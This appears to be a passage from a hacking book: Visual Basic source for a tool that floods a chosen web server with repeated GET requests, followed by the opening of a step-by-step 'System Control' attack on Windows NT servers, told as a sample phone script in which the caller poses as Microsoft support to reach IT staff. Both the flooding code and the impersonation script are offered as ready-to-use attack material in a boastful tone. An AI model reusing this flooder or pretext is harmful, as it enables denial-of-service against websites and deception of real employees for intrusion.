```
main.frm Private Stopper&
Private Sub Command1_Click()
On Error GoTo ErrorHandler
If Command1.Caption = "begin" Then
If IsNumeric(Text2.Text) = False Then
MsgBox "Please enter a valid amount!", vbExclamation, "" : Text2.Text = "0" : Exit Sub
Command1.Caption = "stop"
Text3.Visible = True
For a = 1 To Text2.Text
If Stopper& = 1 Then Exit Sub
Do While Inet1.StillExecuting
DoEvents
Loop
Inet1.Execute Text1.Text, "GET " & Text1.Text
Text3.Text = Text3.Text + 1
Next a
Else
Stopper& = 1
Command1.Caption = "begin"
Text3.Visible = False
End If
Exit Sub
ErrorHandler:
MsgBox "Please enter a valid web server!", vbInformation, ""
Exit Sub
End Sub
```

# System Control

The purpose of this section is to re-create a common system control attack on Win NT servers. Attacks like this one against IT staff happen almost everyday. For simplicity, this hack is broken into a few effortless steps:

Step 1: The Search

In this step, the attacker chooses an IT staff victim. Whether the attacker already knows the victim or searches the victim’s company Web site, it takes very little effort to perform some social engineering to reveal a target email address. Remarkably, some sites actually post IT staff support email addresses, and more remarkably, individual names, addresses, and even photos.

This sample social engineering technique was like taking candy from a baby:

+   - **Hacker:** “Good morning; my name is Joe Hacker from Microsoft. Please transfer me to your IT department. They are expecting my call as I am responding to a support call, ticket number 110158.”
+   - **Reception:** “Oh, okay. Do you have the name of the person you are trying to reach?”
+   - **Hacker:** “No, sorry... The caller didn’t leave a name... wait, let me check... (sound of hacker typing on the keyboard). Nope, only this contact number.”
+   - **Reception:** “I’ll transfer you to Tom; he’s in IT. He’ll know who to transfer you to.”
+   - **Tom:** “Hello?”
+   - **Hacker:** “Good morning, Tom; my name is Joe Hacker, from Microsoft support. I’m responding to a support call, ticket number 110158, and I’m making this call to put your staff on our automated NT security alert list.”